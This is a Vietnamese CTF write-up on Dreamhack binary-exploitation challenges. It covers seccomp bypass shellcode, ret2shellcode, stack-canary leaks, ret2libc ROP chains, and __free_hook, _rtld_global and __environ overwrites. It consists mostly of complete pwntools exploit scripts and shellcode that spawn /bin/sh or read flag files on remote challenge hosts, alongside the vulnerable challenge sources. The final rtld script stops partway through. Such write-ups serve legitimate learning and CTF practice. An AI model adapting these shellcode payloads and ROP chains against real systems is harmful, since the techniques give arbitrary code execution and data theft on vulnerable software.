--- 
title: Dreamhack writeup2 
date: 2025-03-06 00:00:00 +0800
categories: [writeup]
tags: [pwn]
author: "kuvee"
layout: post
published: false
---

1 . Bypass SECCOMP-1
---------------

reverse : 


![image](https://hackmd.io/_uploads/rkw324sXJx.png)


![image](https://hackmd.io/_uploads/ryJp3Ni7yx.png)

source : 

```
// Name: bypass_seccomp.c
// Compile: gcc -o bypass_seccomp bypass_seccomp.c -lseccomp

#include <fcntl.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

void sandbox() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_ALLOW);
  if (ctx == NULL) {
    exit(0);
  }
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(open), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(write), 0);

  seccomp_load(ctx);
}

int main(int argc, char *argv[]) {
  void *shellcode = mmap(0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
                         MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  void (*sc)();

  init();

  memset(shellcode, 0, 0x1000);

  printf("shellcode: ");
  read(0, shellcode, 0x1000);

  sandbox();

  sc = (void *)shellcode;
  sc();
}
```

ta thấy có seccomp nên dùng tool check thử : 


![image](https://hackmd.io/_uploads/SJEy6Nj7ye.png)

- vì vậy ta sẽ thực hiện các syscall tuy khác mà giống với các syscall trên , sau khi mày mò thì ta tìm dc openat
- nó cấm các syscall thực thi như ở hình trên , kh phải kiến trúc 64bit cũng bị cấm

-> ta sẽ dùng openat + sendfile ở bài này 

![image](https://hackmd.io/_uploads/rk5rpNsXke.png)

- ta sẽ set cho dirfd là 0
- đường dẫn thường sẽ là /home/chall/flag
- flags = 0

ngoài ra ta cũng tìm thấy 1 syscall hữu ích khác ( tương đương write và read )

![image](https://hackmd.io/_uploads/Ski86NiXkg.png)

arg1 : tham số đầu sẽ là 1 hoặc 0 (stdout), tham số 2 sẽ stdin vào $rax, tham số thứ 3 là offset bắt đầu đọc (nếu muốn lấy toàn bộ dữ liệu thì để 0 hoặc NULL), tham số 4 là size(ta để 100 cho nó thoáng)

![image](https://hackmd.io/_uploads/rkDupNjXJe.png)


script :

dùng pwntools 

```

#!/usr/bin/python3

from pwn import *
context.binary = exe = ELF('./bypass_seccomp',checksec=False)
#p = process()
p = remote('host3.dreamhack.games', 19961)
payload = shellcraft.openat(0,'/home/bypass_seccomp/flag',0)
payload += shellcraft.sendfile(1,'rax',0,100)
p.sendafter(b'shellcode: ',asm(payload))

p.interactive()
```

shellcode 

```
from pwn import *

p = remote("host1.dreamhack.games", 8872)
#p = process("./bypass_syscall")

context.log_level='debug'

pay = asm('''
mov r10, 0x67616c66
mov [rsp], r10
mov rsi, rsp
xor rdi, rdi
mov rdi, -100

xor rdx, rdx
xor r10, r10
mov eax, 0x101
syscall

mov rdi, 1
xor rsi, rsi
mov rsi, rax
xor rdx, rdx
mov r10, 0x7f
xor rax, rax
mov al, 0x28
syscall

''', os='linux', arch='amd64')

pause()

p.sendafter("shellcode: ", pay)
p.interactive()


```

tham khảo thêm 

```
from pwn import *
context.log_level = "info"
context.arch = "amd64"

elf = ELF("bypass_syscall")

p = remote("host1.dreamhack.games", 24094)

sc = shellcraft.openat(0, "/home/bypass_syscall/flag")
sc += "mov r10, 0xffff"
sc += shellcraft.sendfile(1, "rax", 0).replace("xor r10d, r10d", "")
sc += shellcraft.exit(0)
p.sendlineafter(b"shellcode: ", asm(sc))

p.interactive()
p.close()

```


```
from pwn import *
context.arch = 'amd64'
context.os = 'linux'

#p = process('./bypass_syscall')
p = remote('host1.dreamhack.games', 16778)

p.recv()

payload = '''
xor rax, rax
push rax
mov rax, 0x67616c662f2e
push rax
mov rdi, 0xffffffffffffff9c
mov rsi, rsp
xor rdx, rdx
mov rax, 0x101
syscall         # openat(AT_FDCWD, "./flag")
mov rdi, 0x1
mov rsi, rax
xor rdx, rdx
mov r10, 0x40
mov rax, 0x28
syscall         # sendfile(1, fd, 0, 0x40)
'''

pause()
p.send(asm(payload))
print(p.recv())

p.interactive()

```

ref: 
https://keksite.in/posts/Seccomp-Bypass/


-----------------


2 . SECCOMP
---------

bài này liên quan đến seccomp , 1 tính năng sandbox của linux , seccomp là 1 chức năng lọc các syscall cụ thể trong kernel linux , cung cấp cấp chức năng ngăn chặn việc sử dụng các chức năng cụ thể hoặc hạn chế chỉ sử dụng các chức năng cụ thể .

- có 2 loại seccomp
    - `STRICT_MODE`  chỉ cho phép các syscall đọc ghi , thoát và sigreturn các cuộc gọi hệ
    - `FILTER_MODE` cho phép nhà phát triển định cấu hình bộ lọc cho các chức năng cụ thể và vận hành chúng theo phương thức danh sách cho phép hoặc danh sách từ chối.


![image](https://hackmd.io/_uploads/SyEnHBDV1e.png)


- nhìn vào source thì ta tưởng nó sẽ là FILTER_MODE (dễ khai thác hơn) , tuy nhiên thì không . 1 biến global (mode) dc gán SECCOMP_MODE_STRICT . 1 là STRICT_MODE , 2 là SECCOMP_MODE
- trong trường hợp này nó chỉ được read ,  write , exit , sigreturn

![image](https://hackmd.io/_uploads/Hk2NCNjXye.png)

- phân tích ở IDA ta thấy được các option :
    - 1 :  read shellcode
    - 2 : execute shellcode
    - 3 : Write add

vì vậy ta cần đổi giá trị của mode thành 2 mới có thể thực thi được shell . đó là target của bài 


```
// gcc -o seccomp seccomp.cq
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <stddef.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/unistd.h>
#include <linux/audit.h>
#include <sys/mman.h>

int mode = SECCOMP_MODE_STRICT;

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int syscall_filter() {
    #define syscall_nr (offsetof(struct seccomp_data, nr))
    #define arch_nr (offsetof(struct seccomp_data, arch))
    
    /* architecture x86_64 */
    #define REG_SYSCALL REG_RAX
    #define ARCH_NR AUDIT_ARCH_X86_64
    struct sock_filter filter[] = {
        /* Validate architecture. */
        BPF_STMT(BPF_LD+BPF_W+BPF_ABS, arch_nr),
        BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, ARCH_NR, 1, 0),
        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),
        /* Get system call number. */
        BPF_STMT(BPF_LD+BPF_W+BPF_ABS, syscall_nr),
        };
    
    struct sock_fprog prog = {
    .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),
    .filter = filter,
        };
    if ( prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) == -1 ) {
        perror("prctl(PR_SET_NO_NEW_PRIVS)\n");
        return -1;
        }
    
    if ( prctl(PR_SET_SECCOMP, mode, &prog) == -1 ) {
        perror("Seccomp filter error\n");
        return -1;
        }
    return 0;
}


int main(int argc, char* argv[])
{
    void (*sc)();
    unsigned char *shellcode;
    int cnt = 0;
    int idx;
    long addr;
    long value;

    initialize();

    shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    while(1) {
        printf("1. Read shellcode\n");
        printf("2. Execute shellcode\n");
        printf("3. Write address\n");
        printf("> ");

        scanf("%d", &idx);

        switch(idx) {
            case 1:
                if(cnt != 0) {
                    exit(0);
                }

                syscall_filter();
                printf("shellcode: ");
                read(0, shellcode, 1024);
                cnt++;
                break;
            case 2:
                sc = (void *)shellcode;
                sc();
                break;
            case 3:
                printf("addr: ");
                scanf("%ld", &addr);
                printf("value: ");
                scanf("%ld", addr);
                break;
            default:
                break;
        }
    }
    return 0;
}

```

script : 

```
#!/usr/bin/python3

from pwn import *
context.binary = exe = ELF('./seccomp',checksec=False)
#p = process()
p = remote('host3.dreamhack.games', 19961)
mode = 0x602090
shellcode =asm(shellcraft.sh())
gdb.attach(p,gdbscript='''
           b*main+300
           b*main+337
           b*main+247
           ''')
input()
p.sendlineafter(b'> ',b'3')
p.sendlineafter(b'addr: ',str(mode))
p.sendlineafter(b'value: ',b'2')
p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'shellcode: ',shellcode)
p.sendlineafter(b'> ',b'2')

p.interactive()
```

- có 1 đoạn mình chưa hiểu là tại sao lại truyền str(mode) mà không phải p64 hay bytes ?
- vì ở đây scanf(%ld) long int . và khi ta truyền (0x602090=6299792)  str(0x602090) = ‘6299792’ . nó mới có thể hiểu được

tham khảo các script khác :

```
from pwn import *

#p = process('./seccomp')
p = remote("host1.dreamhack.games", 8253)
e = ELF('./seccomp')

context.arch = 'amd64'

p.sendlineafter('> ', '3')
p.sendlineafter(': ', str(e.got['prctl']))
p.sendlineafter(': ', str(0x400A67))

shellcode = shellcraft.amd64.sh()
shellcode = asm(shellcode)

p.sendlineafter('> ', '1')
p.sendafter(': ', shellcode)

p.sendlineafter('> ', '2')
p.interactive()
```
->>>>
```
from pwn import*

p = remote('host1.dreamhack.games', '8247')
#p = process('./target', env={'LD_PRELOAD':'./libc.so.6'})
e = ELF('./target')
context.arch = 'x86_64'

#context.log_level='debug'
#gdb.attach(p)

read_plt = e.plt['read']
read_got = e.got['exit']
bss = e.bss()

log.info(hex(read_got))

p.sendlineafter('> ', '3')
p.sendlineafter('addr: ', '6299792') # mode = 0x602090
p.sendlineafter('value: ', '0')

p.sendlineafter('> ', '1')

# write(1, read_got, 0x8);
payload = asm("mov rax, 1")
payload += asm("mov rdi, 1")
payload += asm("mov rsi, 0x602040")
payload += asm("mov rdx, 0x8") 
payload += asm("syscall")

# read(0, bss, 0x8);
payload += asm("mov rax, 0")
payload += asm("mov rdi, 0")
payload += asm("mov rsi, 0x6020c0")
payload += asm("mov rdx, 0x8") 
payload += asm("syscall")

# read(0, read_got, 0x8);
payload += asm("mov rax, 0")
payload += asm("mov rdi, 0")
payload += asm("mov rsi, 0x602078")
payload += asm("mov rdx, 0x8") 
payload += asm("syscall")

# execve("/bin/sh\x00")
payload += asm("mov rax, 59")
payload += asm("mov rdi, 0x6020c0")
payload += asm("mov rsi, 0")
payload += asm("mov rdx, 0")
payload += asm("syscall")
payload += asm("ret")

p.sendline(payload)

p.sendlineafter('> ', '2')

leak = u64(p.recv(8))
log.info(hex(leak))
system = leak-0x2aae0

p.send('/bin/sh\x00')
p.send(p64(system))

p.interactive()

```


---------------


3 . basic_exploitation_000
--------

- bài này đơn giản là ret2shellcode =)) éo hiểu sao debug mãi cái offset ovw ret không đúng
- byte 0xb vô nghĩa với scanf (hoặc code asm nhà làm có lượng byte k chia hết cho 4)



![image](https://hackmd.io/_uploads/S1DrISv4yl.png)



script :

```
#!/usr/bin/python3


from pwn import *

context.binary = exe = ELF('./exploit',checksec=False)
p= remote('host3.dreamhack.games',11166)
#p = process()
shellcode = asm(
    '''
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    mov edx, eax
    mov al, 0x8
    inc al
    inc al
    inc al
    int 0x80
    ''', arch='i386')
#shellcode = asm(shellcraft.sh())
p.recvuntil(b'(')
leak = int(p.recvline()[:-2].decode(),16)
print(hex(leak))
#input()
payload = b'\x90' * 20
payload += shellcode
payload = payload.ljust(132,b'a')
payload += p32(leak)
#payload +=
p.sendline(payload)
p.interactive()
```


----------

4 . Return to Shellcode
-----

bài này chỉ đơn giản là leak canary = read , và ret2shellcode
![image](https://hackmd.io/_uploads/HkBFISPEyl.png)

source : 

```
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}


int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();
    
    printf("buf = (%p)\n", buf);
    scanf("%141s", buf);

    return 0;
}

```

script 


```
#!/usr/bin/python3

from  pwn import *

context.binary = exe = ELF('./r2s',checksec=False)
#p = process()
p = remote('host3.dreamhack.games',16854)
p.recvuntil(b': ')
buf = int(p.recvline().strip(),16)
print("buf: ",hex(buf))
payload = b'a'*89
shellcode = shellcraft.sh()
p.sendafter(b'Input: ',payload)
p.recvuntil(b'a'*89)
canary = u64(b'\x00' + p.recv(7).strip())
print("canary : ",hex(canary))
#gdb.attach(p)
#input()
payload = asm(shellcode)
payload = payload.ljust(88,b'a')
payload += p64(canary)
payload += p64(0)
payload += p64(buf)
p.sendlineafter("Input: ",payload)
p.interactive()
```

![image](https://hackmd.io/_uploads/HyuN-roQJl.png)


------------


5 . ssp_001
---------


source :

```
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}
void get_shell() {
    system("/bin/sh");
}
void print_box(unsigned char *box, int idx) {
    printf("Element of index %d is : %02x\n", idx, box[idx]);
}
void menu() {
    puts("[F]ill the box");
    puts("[P]rint the box");
    puts("[E]xit");
    printf("> ");
}
int main(int argc, char *argv[]) {
    unsigned char box[0x40] = {};
    char name[0x40] = {};
    char select[2] = {};
    int idx = 0, name_len = 0;
    initialize();
    while(1) {
        menu();
        read(0, select, 2);
        switch( select[0] ) {
            case 'F':
                printf("box input : ");
                read(0, box, sizeof(box));
                break;
            case 'P':
                printf("Element index : ");
                scanf("%d", &idx);
                print_box(box, idx);
                break;
            case 'E':
                printf("Name Size : ");
                scanf("%d", &name_len);
                printf("Name : ");
                read(0, name, name_len);
                return 0;
            default:
                break;
        }
    }
}
```

- bài này có 3 option
- option F : không có bug ở hàm này
- option P : nó sẽ in box[idx] mà ta đã nhập ở option F → vì không có kiểm tra idx → có thể leak được dữ liệu ( ta sẽ leak canary ở bài này vì có hàm get_shell nên có thể là ret2win )
- option E : có BOF , nhập size tùy ý

```Target : leak canary + BOF → ret2win```


script 

```
#!/usr/bin/python3

from  pwn import *

context.binary = exe = ELF('./ssp_001',checksec=False)
#p = process()
p = remote('host3.dreamhack.games',8842)
def read_(data):
    p.sendlineafter(b'> ',b'F')
    p.sendafter(b'box input : ',data)
def print_(idx):
    p.sendlineafter(b'> ',b'P')
    p.sendlineafter(b'index : ',str(idx))

def exit_(name):
    p.sendlineafter(b'> ',b'E')
    p.sendlineafter(b'Size : ',str(len(name)))
    p.sendlineafter(b'Name : ',name)
read_(b'a'*0x40)
Canary = [0]
for i in range(3):
    print_(0x80+i+1)
    p.recvuntil(b'is : ')
    canary = int((b'0x'+p.recv(2)).decode(),16)
    print("byte found: ",hex(canary))
    Canary.append(canary)
    print(Canary)
print(b'canary: ',Canary)
canary = u32(b''.join([p8(b) for  b in Canary]))
print("canary: ",hex(canary))
get_shell = p32(exe.sym.get_shell)
payload = b'a'*0x40
payload += p32(canary)
payload += b'a'*8
payload += get_shell
input()
exit_(payload)
p.interactive()
```

bonus 

```
from pwn import *

e = ELF('./ssp_001')
p = remote('host1.dreamhack.games',8219)
canary = ''

for i in range(128,132):
	p.sendafter('>','P')
	p.sendlineafter(':',str(i))
	p.recvuntil(':')
	canary += chr(int(p.recvline().strip(),16))

canary = u32(canary)
log.info(hex(canary))

p.sendafter('>','E')
p.sendlineafter(':','1000')
p.sendafter(':','A'*0x40 + p32(canary) + 'A'*8 + p32(e.symbols['get_shell']))

p.interactive()
```

-------------



6 . rop
-------


- bài này chỉ là ret2libc
- cả 2 lần read đều bị BOF , lần read đầu tiên sẽ leak canary → read thứ 2 sẽ leak read_got hoặc puts_got → ret2libc

![image](https://hackmd.io/_uploads/HyTKGSiQJe.png)

script :

```
#!/usr//bin/python3
from pwn import *
context.binary = exe = ELF('./rop',checksec=False)
libc = ELF('./libc.so.6')
#p = process()
p = remote('host3.dreamhack.games', 23953)

p.sendafter(b'Buf: ',b'a'*56+b'b'*1)
p.recvuntil(b'b')
canary = u64(b'\x00'+p.recv(7))
print("canary: ",hex(canary))
read_got = exe.got.puts
read_plt = exe.sym.puts
write = exe.sym.write
pop_rsi_r15 = 0x0000000000400851
pop_rdi = 0x0000000000400853
main = exe.sym.main

payload = b'a'*56
payload += p64(canary)
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(read_got)
payload += p64(read_plt)
payload += p64(main)
p.sendafter(b'Buf: ',payload)

puts_got = u64(p.recv(7)+b'\x00\x00')
libc.address = puts_got - libc.sym.puts
system = libc.sym.system
bin_sh = next(libc.search('/bin/sh'))

p.sendafter(b'Buf: ',b'a'*56)
payload = b'a'*56
payload += p64(canary)
payload += p64(0)
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)
p.sendafter(b'Buf: ',payload)
p.interactive()
```
- hướng thứ 2 mà ta có thể khai thác là dùng write để leak read_got ra , xong dùng read để ghi system đè lên read_got
- read_got + 8  sẽ là /bin/sh → và lúc này nó sẽ thực thi system(’/bin/sh’) thay vì read_got(’/bin/sh’)

```
from pwn import *

context.log_level = 'debug'
p = remote('host3.dreamhack.games', 22426)
e = ELF('./rop')
libc = ELF('./libc.so.6')
read_got = e.got['read']
read_plt = e.plt['read']
write_plt = e.plt['write']
pop_rdi = 0x400853
pop_rsi_r15 = 0x400851
ret = 0x400854

payload = b'A' * 0x39
p.sendafter(b'Buf: ', payload)
p.recvuntil(payload)
canary = u64(b'\x00' + p.recvn(7))

payload = b'A' * 0x38 + p64(canary) + b'B' * 0x8
# write(1, read_got, ...)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

# read(0, read_got, ...)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

# read("/bin/sh\x00") -> system("/bin/sh")
payload += p64(pop_rdi) + p64(read_got + 0x8)
payload += p64(ret) + p64(read_plt)

p.sendafter(b'Buf: ', payload)

read = u64(p.recvn(6) + b'\x00' * 2)
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']

p.send(p64(system) + b'/bin/sh\x00')

p.interactive()
```

------------

7 . basic_rop_x64
------

1 bài basic ret2libc nên skip

![image](https://hackmd.io/_uploads/H1D-vBPN1e.png)

```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./basic_rop_x64',checksec=False)
libc = ELF('./libc.so.6')
p = remote('host3.dreamhack.games', 21226)
#p = process()
payload = b'a'*72
payload += p64(0x0000000000400883)
payload += p64(exe.got.read)
payload += p64(exe.plt.puts)
payload += p64(exe.sym.main)
p.send(payload)
p.recvuntil(b'a'*64)
leak = u64(p.recv(6)+b'\x00\x00')
print("leak: ",hex(leak))
libc.address = leak - libc.sym.read
print("libc address: ",hex(libc.address))
print("system: ",hex(libc.sym.system))
print("bin sh: ",hex(next(libc.search('/bin/sh\x00'))))
payload = b'a'*72
payload += p64(0x0000000000400883+1)
payload += p64(0x0000000000400883)
payload += p64(next(libc.search('/bin/sh\x00')))
payload += p64(libc.sym.system)
p.send(payload)
p.interactive()
```


----------


8 . basic_rop_x86
------

- cũng là 1 bài leak libc , tuy nhiên là 32 bit → những bài này cần chú ý đến libc , còn lại thì kh có vấn đề gì
- ta cũng có thể dùng hàm write để leak write got ( thiết lập arg để leak )
![image](https://hackmd.io/_uploads/rJ2XwHwVJl.png)

```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./basic_rop_x86',checksec=False)
libc = ELF('./libc.so.6')
p = remote('host3.dreamhack.games', 23182)
#p = process()
payload = b'a'*72
payload += p32(exe.plt.puts)
payload += p32(exe.sym.main)
payload += p32(exe.got.read)
p.send(payload)
p.recvuntil(b'a'*64)
leak = u32(p.recv(4))
print("leak read",hex(leak))
libc.address = leak - libc.sym.read
print("libc address: ",hex(libc.address))
system = libc.sym.system
print(hex(system))
bin_sh = next(libc.search('/bin/sh\x00'))
print(hex(bin_sh))
payload = b'a'*72
payload += p32(system)
payload += p32(0x080483c2)
payload += p32(bin_sh)
p.send(payload)
p.interactive()
```

---------


9 . fho ( Free Hock overwrite ) 
-------

nhắc lại : kỹ thuật này : Trong C, các hàm chịu trách nhiệm phân bổ và giải phóng bộ nhớ động là malloc(), free(), và realloc(). Mỗi hàm được triển khai trong libc.so.

```
$ readelf -s /lib/x86_64-linux-gnu/libc-2.27.so | grep -E "__libc_malloc|__libc_free|__libc_realloc"
   463: 00000000000970e0   923 FUNC    GLOBAL DEFAULT   13 __libc_malloc@@GLIBC_2.2.5
   710: 000000000009d100    33 FUNC    GLOBAL DEFAULT   13 __libc_reallocarray@@GLIBC_PRIVATE
  1619: 0000000000098ca0  1114 FUNC    GLOBAL DEFAULT   13 __libc_realloc@@GLIBC_2.2.5
  1889: 00000000000979c0  3633 FUNC    GLOBAL DEFAULT   13 __libc_free@@GLIBC_2.2.5
  1994: 000000000019a9d0   161 FUNC    GLOBAL DEFAULT   14 __libc_freeres@@GLIBC_2.2.5
```

ibc định nghĩa hook để tạo điều kiện gỡ lỗi các hàm này . Ví dụ  : hàm malloc() kiểm tra xem giá trị của _ malloc_hook có phải là NULL hay không . nếu đúng , nó sẽ thực thi hàm được trỏ tới bởi malloc  _hook trước khi thực sự thực thi malloc() . Trong trường hợp này , đối số của malloc() dc truyền cho hàm hook , tương tự , free() và realloc() sử dụng các biến hook có tên __free_hook và __realloc_hook tương ứng


```
$ readelf -s /lib/x86_64-linux-gnu/libc-2.27.so | grep -E "__malloc_hook|__free_hook|__realloc_hook"
   221: 00000000003ed8e8     8 OBJECT  WEAK   DEFAULT   35 __free_hook@@GLIBC_2.2.5
  1132: 00000000003ebc30     8 OBJECT  WEAK   DEFAULT   34 __malloc_hook@@GLIBC_2.2.5
  1544: 00000000003ebc28     8 OBJECT  WEAK   DEFAULT   34 __realloc_hook@@GLIBC_2.2.5
```

Độ lệch của các biến này lần lượt là 0x3ed8e8, 0x3ebc30, và 0x3ebc28. Như thấy từ thông tin tiêu đề phần, chúng được đặt trong phần .bss. libc.soVì .bssphần này có thể ghi được nên có thể thao tác các giá trị của các biến này.

```
$ readelf -S /lib/x86_64-linux-gnu/libc-2.27.so | grep -A 1 "\.bss"
  [35] .bss              NOBITS           00000000003ec860  001ec860
       0000000000004280  0000000000000000  WA       0     0     32
```

vào lại bài :

- ở lần nhập đầu tiên ta thấy có overflow , và phía sau đó là print → có thể leak được gì đó
- lần nhập thứ 2 ta cũng thấy nó cho ta nhập vào 1 địa chỉ tùy ý ( ở đây là con trỏ hàm )
- tiếp theo là ghi giá trị của con trỏ hàm ta vừa ghi
- cuối cùng là free(ptr)

![image](https://hackmd.io/_uploads/BkWWIHom1g.png)

từ kĩ thuật trên , hướng khai thác tấn công sẽ là :

leak libc_start_main → libc base


ghi con trỏ hàm muốn ghi vào là __free_hook , v5 sẽ là system , lúc này system đã ghi đè dc free hook

ptr sẽ là con trỏ trỏ đến /bin/sh

script :

```
   
    1 #!/usr/bin/python3
    2 from pwn import *
    3 context.binary = exe = ELF('./fho')
    4 libc =  ELF('./libc-2.27.so',checksec=False)
    5 #p = process(exe.path)
    6 p = remote('host3.dreamhack.games', 17398)
    7 payload = b'a'*72
    8 p.sendafter(b'Buf: ',payload)
    9 p.recvuntil(b'a'*72)
   10 libc_start = u64(p.recv(6).ljust(8,b'\x00'))                                                                                     11 print("libc start main: ",hex(libc_start))
   12 libc.address = libc_start - (libc.sym.__libc_start_main + 231)
   13 print('libc address: ',hex(libc.address))
   14 free_hock = libc.sym.__free_hook
   15 system = libc.sym.system
   16 bin_sh = next(libc.search('/bin/sh\x00'))
   17 p.sendlineafter(b'write: ',str(free_hock))
   18 p.sendlineafter(b'With: ',str(system))
   19 p.sendlineafter(b'free: ',str(bin_sh))
   20 p.interactive()                                                                                                               ~
```

--------


10 . Overwrite _rtld_global
------

- mặc dù có lời giải nhưng sau mấy tiếng vật vã mới làm ra vì cái pwninit lỗi và libc củ chuối :)))
- reverse : nó sẽ cho ta thay đổi giá trị mà ta muốn , sử dụng 1 để tiếp tục vòng lặp while , được cho sẵn libc

![image](https://hackmd.io/_uploads/rktD8ro7Je.png)

ở đây ta thấy dl_load_lock dc truyền như đối số , còn __rtld_lock_lock_recursive sẽ thực thi đối số đó ( ở đây nó là 1 con trỏ hàm )

![image](https://hackmd.io/_uploads/rk3uUrjXkl.png)

- ta sẽ làm bài này như sau
    - lấy địa chỉ libc
    - lấy libc_base + ld_base
    - lấy địa chỉ rtld_global ( được lấy từ ld )
    - lấy địa chỉ  _dl_rtld_lock_recursive & _dl_load_lock


![image](https://hackmd.io/_uploads/ryroLBiQyl.png)


```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./ow_rtld_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")
#p = process(exe.path)
p = remote('host3.dreamhack.games', 9955)
context.binary = exe
p.recvuntil(b'stdout: ')
leak = int(p.recvline()[:-1],16)
libc.address = leak - libc.sym._IO_2_1_stdout_
ld_base = libc.address + 4132864
rtld_global = ld_base + ld.symbols['_rtld_global']
dl_load_lockc = rtld_global + 2312
dl_rtld_lock_recursive = rtld_global + 3840
p.sendlineafter(b'> ','1')
p.sendlineafter(b'addr: ',str(dl_load_lockc))
p.sendlineafter(b'data: ',str(u64('/bin/sh\x00')))
p.sendlineafter(b'> ','1')
p.sendlineafter(b'addr: ',str(dl_rtld_lock_recursive))
p.sendlineafter(b'data: ',str(libc.sym.system))
p.sendlineafter(b'> ',b'2')
p.interactive()
```

ref : 

https://keyme2003.tistory.com/entry/dreamhack-Overwrite-rtldglobal

https://wyv3rn.tistory.com/104

--------


11 . __environ
--------


- reverse :
- hàm read_file để ghi flag vô stack → vậy cần chú ý đến stack ( leak dc stack address hay gì đó )
- scanf đầu tiên để duy trì while nên kh cần chú ý
- scanf thứ 2 in dữ liệu trong địa chỉ ra → ta có thể chèn địa chỉ stack chứa flag vào và nó sẽ in flag ra ( target của bài )

![image](https://hackmd.io/_uploads/H1wmwSsmkx.png)

- vì phần leak đã làm nhiều nên sẽ kh cần nói qua , ta chỉ chú ý đến tìm offset
- tên bài đã nói lên quá nhìu điều :v   , ta cần tính offset giữa con trỏ đến địa chỉ trong __environ với địa chỉ chứa dữ liệu flag

![image](https://hackmd.io/_uploads/rkXDvSsXkl.png)

- offset = 5480

vậy từng bước của bài này như sau :

- bước 1 : leak libc , tìm libc.sym.__environ
- bước 2 : leak dc stack_add trong __environ bằng scanf thứ 2 , tìm offset
- bước 3 : lấy địa chỉ leak dc trừ đi offset sẽ là địa chỉ chứa flag → nhập địa chỉ đó vào và ping pong lấy flag

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./environ_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

#p = process(exe.path)
p = remote('host3.dreamhack.games', 20212)
#gdb.attach(p,gdbscript='''
#           b*read_file+88
#           ''')
#input()
p.recvuntil(b'stdout: ')
leak = int(p.recvline().strip(),16)
print("leak: ",hex(leak))
libc.address = leak - libc.sym._IO_2_1_stdout_
print("libc.address: ",hex(libc.address))
env = libc.sym.__environ
print("env: ",hex(env))
#gdb.attach(p,gdbscript='''
#           b*read_file+88
#           ''')
#input()
p.sendlineafter(b'> ',b'1')
p.sendlineafter(b': ',str(env).encode())
leak_2 = u64(p.recv(6).ljust(8,b'\x00'))
print(hex(leak_2))
file_context = leak_2 - 0x1568
p.sendlineafter(b'> ',b'1')
p.sendlineafter(": ",str(file_context).encode())
#gdb.attach(p)
#input()
p.interactive()
```

ref : 

https://cw00h.github.io/til/hacking/TIL220913/


----------------

32 . rtld
-------

source  : 

```
// gcc -o rtld rtld.c -fPIC -pie

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <dlfcn.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

void get_shell() {
    system("/bin/sh");
}

int main()
{
    long addr;
    long value; 

    initialize();

    printf("stdout: %p\n", stdout);

    printf("addr: ");
    scanf("%ld", &addr);

    printf("value: ");
    scanf("%ld", &value);

    *(long *)addr = value;
    return 0;
}
```
![image](https://hackmd.io/_uploads/SJqdvBD4kl.png)

bài này tương tự với rtld overwrite chỉ khác là dùng one_gadget 

script 

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./rtld_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe
p = remote('host3.dreamhack.games', 22474)
#p = process(exe.path)
p.recvuntil(b': ')
leak = int(p.recvline()[:-1],16)
print("leak: ",hex(leak))
libc.address = leak - libc.sym._IO_2_1_stdout_
ld_base = libc.address + 3973120
print("libcaddress: ",hex(libc.address))
print("ld_base: ",hex(ld_base))
rtld_global = ld_base + ld.sym._rtld_global
dl_load_lock = rtld_global + 2312
recursive = rtld_global + 3848
print("recursive: ",hex(recursive))
p.sendlineafter(b'addr: ',str(recursive))
